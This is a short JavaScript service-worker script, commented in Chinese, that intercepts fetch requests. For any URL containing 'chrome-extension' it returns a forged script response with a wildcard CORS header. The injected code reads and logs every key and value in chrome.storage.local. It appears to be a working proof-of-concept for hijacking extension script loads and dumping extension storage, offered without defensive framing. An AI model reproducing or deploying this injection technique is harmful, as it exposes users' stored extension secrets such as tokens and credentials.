self.addEventListener("fetch", (event) => {
    console.log(`Handling fetch event for ${event.request.url}!`);
    if(event.request.url.indexOf("chrome-extension") === -1){
        event.respondWith(fetch(event.request.url));
        return;
    }
    if(event.request.url.indexOf("chrome-extension") != -1){
        var a =             new Response(`(async function foo() {
            chrome.storage.local.get(null, function(items) {
          // 提取所有键
          const keys = Object.keys(items);
      
          // 打印结果
          console.log('存储中的所有键:', keys);
      
          // 你也可以逐个处理每个键
          keys.forEach(function(key) {
              console.log('键:', key, '值:', items[key]);
                  });
              });
          })();`, {
          headers: {'Content-Type': 'text/javascript', 'Access-Control-Allow-Origin':"*"}
        })
        event.respondWith(
            a
         )
        return;
    }
    return;
});
